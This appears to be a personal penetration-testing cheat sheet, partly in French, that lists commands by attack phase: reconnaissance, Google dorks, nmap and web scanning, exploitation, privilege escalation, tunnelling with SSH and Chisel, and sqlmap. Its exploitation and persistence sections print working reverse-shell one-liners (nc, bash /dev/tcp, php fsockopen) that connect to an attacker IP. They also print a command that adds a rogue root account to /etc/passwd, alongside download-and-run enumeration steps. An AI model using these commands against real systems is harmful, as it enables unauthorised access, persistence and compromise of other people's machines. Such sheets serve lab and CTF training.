# Commands by Hacking phases

## Recognition

```sh
host [DOMAIN] # ressort IPv4 IPv6
```

```sh
whois [DOMAIN] # permet de récupérer des infos sur les serveurs dns utilisés (serveur ip dispo, nom proprio, adresse)
```

```sh
dig [nomDomaine] # récupérer les adresses de DNS. Possibilité de récupérer d'autres informations avec les options -h
```

```sh
dnsenum [nomDomaine] # récuperer enregistrement DNS et serveur Nx
```

```sh
dmitry # @IP, domaine, mails, scan de ports...
```

```sh
tcptraceroute [nomDomaine]
```

```sh
theharvester -d [nomDomaine] # récupération d'emails, noms d'hotes
```

```sh
maltego # recherche d'infos sur une personne, un nom de domaine...
```


**wayBack** : http://web.archive.org/

**Shodan** : https://www.shodan.io/

**Exploit Database** : https://www.exploit-db.com/



## Google dorks Search filters

| Filter                                     | Description                                                                                       |
| :----------------------------------------- | :------------------------------------------------------------------------------------------------ |
| `allintext:"keyword"`                      | Searches for occurrences of all the keywords given.                                               |
| `intext:"keyword"`                         | Searches for the occurrences of keywords all at once or one at a time.                            |
| `inurl:"keyword"`                          | Searches for a URL matching one of the keywords.                                                  |
| `allinurl:"keyword"`                       | Searches for a URL matching all the keywords in the query.                                        |
| `intitle:"keyword"`                        | Searches for occurrences of keywords in title all or one.                                         |
| `allintitle:"keyword"`                     | Searches for occurrences of keywords all at a time.                                               |
| `site:"www.google.com"`                    | Specifically searches that particular site and lists all the results for that site.               |
| `filetype:"pdf"`                           | Searches for a particular filetype mentioned in the query.                                        |
| `link:"keyword"`                           | Searches for external links to pages.                                                             |
| `numrange:321-325`                         | Used to locate specific numbers in your searches.                                                 |
| `(before:2000-01-01 after:2001-01-01)`     | Used to search within a particular date range.                                                    |
| `inanchor:rat` (allinanchor)               | This shows sites which have the keyterms in links pointing to them, in order of the most links.   |
| `allinpostauthor:"keyword"` (inpostauthor) | Exclusive to blog search, this one picks out blog posts that are written by specific individuals. |
| `related:www.google.com`                   | List web pages that are “similar” to a specified web page.                                        |
| `cache:www.google.com`                     | Shows the version of the web page that Google has in its cache.                                   |


<details>

#### OR - AND

```
site:facebook.com | site:twitter.com
site:facebook.com & site:twitter.com
```

#### Include results

This will order results by the number of occurrence of the keyword.
```
-site:facebook.com +site:facebook.*
```

#### Exclude results

```
site:facebook.* -site:facebook.com
```

#### Synonyms

Adding a tilde to a search word tells Google that you want it to bring back synonyms for the term as well. For example, entering “~set” will bring back results that include words like “configure”, “collection” and “change” which are all synonyms of “set”.
```
~set
```

#### Glob pattern (*)

Putting an asterisk in a search tells Google ‘I don’t know what goes  here’. Basically, it’s really good for finding half remembered song lyrics or names of things.
```
site:*.com
```

</details>

___
## Scanning

### Machine enumeration

```sh
fping/ping # vérifier la présence d'une machine sur le réseau
fping -g [réseau local] # donne toutes les @ du réseau local qui sont reachable

```

**nmap**: scanner de port open source (graphique -> zenmap)
```sh
nmap -sV -p- [ip] # scan network or a machine
 -sV # service version detection
 -O  # operating system detection
 -v  # verbose or -vv
 -A  # agressives scan (OS, script, traceroute) open ports, services, version --> when you don't care how 'loud' you are

 -Pn # if I don't want to ping the host

 --script vuln # if I want to run all scripts out of the vulnerability category
# all categories: https://nmap.org/book/nse-usage.html

# Timing template. (increase the speed your scan runs at) - /!\ higher speeds are noisier, and can incur errors!
 -T5

#### Ping sweep ####
-sn [networkIp]/[CIDR] # to obtain a map of the network structure.

#### SAVE THE OUTPUT ####
 -oA # three major formats
 -oN # normal format
 -oG # Grepable format
 -oX # output in xml format

xsltproc filename.xml -o filename.html # on peut ouvrir dans le navigateur d'un récapitulatif facile à lire.
```


<br>


```sh
nessus # signale les faiblesses potentielles sur les machines testées (à télécharger sur tenable)
/etc/init.d/nessusd start # démarrer nessus
http://localhost:8834 # accès à nessus + s'enregistrer sur tenable pour un code d'activation
```
**wireshark** : capture des trames...



### Website Scanner

```sh
nikto -h [url]
wapiti
```

```sh
gobuster dir -u [url] -w [wordlist_path] -e -x .php,.txt,.html -o output.txt
dirbuster
wfuzz
```

### URL/.git/

```sh
wget --mirror -I .git URL/.git/
git checkout -- # if some files have been deleted, get them back
git log
git checkout <LOG-ID> # go back to a previous commit
```

+ **git-dumper**: tool to dump a git repository from a website: https://github.com/arthaud/git-dumper
+ **git-tools**: A repository with 3 tools for pwn'ing websites with .git repositories available: https://github.com/internetwache/GitTools
+ **githacker**: A Git source leak exploit tool that restores the entire Git repository, including data from stash, for white-box auditing and analysis of developers' mind: https://github.com/captain-noob/GitHacker

___
## Exploit (Gaining Access)

### Reverse Shell

#### Shell upgrading

```sh
/usr/bin/script -qc /bin/bash /dev/null # works almost all the time

python3 -c 'import pty;pty.spawn("/bin/bash")' # only if python is installed
```

#### Shell Stabilization
```sh
export TERM=xterm # this will give us access to term commands such as clear
Ctrl + Z # background the shell
stty raw -echo; fg # This does two things: 1. it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
```

#### BASH reverse shell one line
```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip] 4444 >/tmp/f

bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" # possibility not to use 'bash -c' at the beginning

nc [IP] [PORT]

php -r '$sock=fsockopen("[IP]",[port]);exec("/bin/sh -i <&3 >&3 2>&3");'
```

___
## Persistence (Maintaining Access) - Privilege Escalation

```sh
echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd # to create another root user
```


### Linux Privilege Escalation


```sh
sudo -l # check current privileges

netstat -ltupn # listening port
ss -tulw # listening port

cat /etc/crontab # checko cronjob
```

#### FIND

```sh
find / -iname "*config*.php" 2>/dev/null # looking for config files - cat [filename] | grep -i "db_"
find / -user root -perm -u=s 2>/dev/null # Find all files/dirs that are owned by root and have at least the SUID permission

find / -group [name] 2>/dev/null # Find all files/dirs owned by a group
find / -user [username] 2>/dev/null # Find all files/dirs owned by a user

-perm 444 # exactly readable by everyone
-perm /444 # only readable by everyone

-exec [command] [option] {}\; 2>/dev/null # {} corresponds to the files returned by the find command
```

#### GREP

```sh
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" # grep ip addresses from your output.
```

#### LSE - linux-smart-enumeration
https://github.com/diego-treitos/linux-smart-enumeration

```sh
wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh

curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh;chmod 700 lse.sh
```


#### LES - linux-exploit-suggester
https://github.com/mzet-/linux-exploit-suggester

```sh
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh;chmod 700 les.sh
```

#### LinPEAS - Linux Privilege Escalation Awesome Script
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

```sh
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -Lo lPEAS.sh;chmod 700 lPEAS.sh
```
___
## Clearing Track



___
# Other useful commands

## Steganography

Find images information

```sh
identify -verbose
pngcheck [image]
zsteg [image] # detect stegano data hidden in PNG & BMP
```

```sh
steghide extract -sf [filename]
stegcracker [file] [wordlist] # bruteforce steghide passphrase
```

___
## HTTP Server

### Python 2.x

```sh
python -m SimpleHTTPServer 8000
```

### Python 3.x

```sh
python -m http.server 8000
```

___
## SSH

```sh
ssh [ip] -p [port] # connect to an ssh server
```

### SSH port forwarding
```sh
ssh -N user@[IP_distant] -L [@_redirection_machine]:[port_redirection]:[IP_redirigee]:[port_redirige]
```


Example:
```sh
ssh -N user@10.10.10.10 -L 172.17.0.1:4441:192.168.0.100:80
```
Sur la machine `10.10.10.10`, `user` fait tourner un serveur web au niveau de son interface `192.168.0.100:80`. Ici, je redirige sur mon adresse `172.17.0.1` (celle sur le même réseau que mon container docker) et sur le port 4441. Donc depuis mon navigateur, http://172.17.0.1:4441 est joignable. En indiquant un proxy sur `172.17.0.2:4440`, je peux modifier les requêtes sur Burpsuite si besoin.

## Chisel

https://github.com/jpillora/chisel

### Port forwarding

```sh
# on the attacker
cd /path/where/chisel/is # binary file
updog # or whatever cmdline to setup a http server

# on the victim
wget IP:PORT/chisel
chmod +x chisel # set it executable

# on the attacker
chisel server --reverse --port 9002 # port forwarding

# on the victim
./chisel client YOUR_IP:9002 R:9001:[redirectedIP]:[redirectedPort]

# Now you have access on the attacker's machine to : localhost:9001
```
___
## File Editor

```sh
hexeditor # hexadecimal
```

___
## Web


### Attaque SQL

```sh
sqlmap -u "http://172.16.128.39:8080/student_grade/index.php?student_id=" --tables -D Dysto_School -T student
```

### Website request command line
```sh
curl -v [url]
curl -v -X POST [url]
wget [url]
```

___
## Forensic Investigation
```sh
volatility
testdisk
```

### Hidden files extraction
```sh
binwalk -e
```

## Create video of a terminal session

(This is just text so you can do CTRL+C & CTRL+V on the video)
https://asciinema.org/

### To embed the video in Markdown
https://github.com/marionebl/svg-term-cli
